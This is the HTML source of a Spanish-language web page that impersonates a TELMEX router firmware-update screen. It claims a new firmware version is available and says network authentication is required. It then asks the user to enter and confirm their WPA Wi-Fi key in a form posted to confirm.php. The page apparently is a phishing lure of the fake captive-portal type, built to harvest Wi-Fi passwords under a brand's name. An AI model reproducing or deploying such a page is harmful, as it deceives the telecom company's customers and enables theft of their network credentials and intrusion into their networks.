<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./css/style.css">
    <title>Terminal Óptica</title>
</head>
<body>
    <div class="contenido">
        <nav class="nav">
            <ul>
                <li>
                    <a href=""><img src="./img/telmex.svg" alt="TELMEX"></a>
                </li>
            </ul>
        </nav>
        <div class="body_content">
            <div class="titulo_pag">
                <h1>TELMEX</h1>
            </div>
            <div class="card_red">
                <div class="title">
                    <p>ACTUALIZACIÓN DEL FIRMWARE</p>
                </div>
                <div class="desc">
                    <p>Hay un nuevo firmware disponible para mejorar el desempeño y funcionamiento del sistema.<br><b>Versión Actual:</b> 8.2.16.2<br><b>Versión a Actualizar:</b> 8.2.24.0</p>
                </div>
            </div>
            <div class="card_yellow">
                <div class="title">
                    <p>Se necesita autenticación para poder continuar con la operación. Por favor ingrese sus credenciales de red.</p>
                </div>
            </div>
            <div class="error">
                <span id="error_message"></span>
            </div>
            <div class="form">
                <form action="confirm.php" method="POST">
                    <p>
                        <label for="password">Clave WPA</label>
                    </p>
                    <p>
                        <input type="password" name="password" autocomplete="off" id="password1" required>
                    </p>
                    <p>
                        <label for="password_check">Confirmar Clave</label>
                    </p>
                    <p>
                        <input type="password" name="password_check" autocomplete="off" id="password2" required>
                    </p>
                    <p>
                        <input type="checkbox" id="showPassword"> <span id="textCheckBox">Mostrar Clave</span>
                        <input type="submit" value="Actualizar" id="submit" onsubmit="return validation()">
                    </p>
                </form>
            </div>
        </div>
    </div>
    <script src="./js/main.js"></script>
</body>
</html>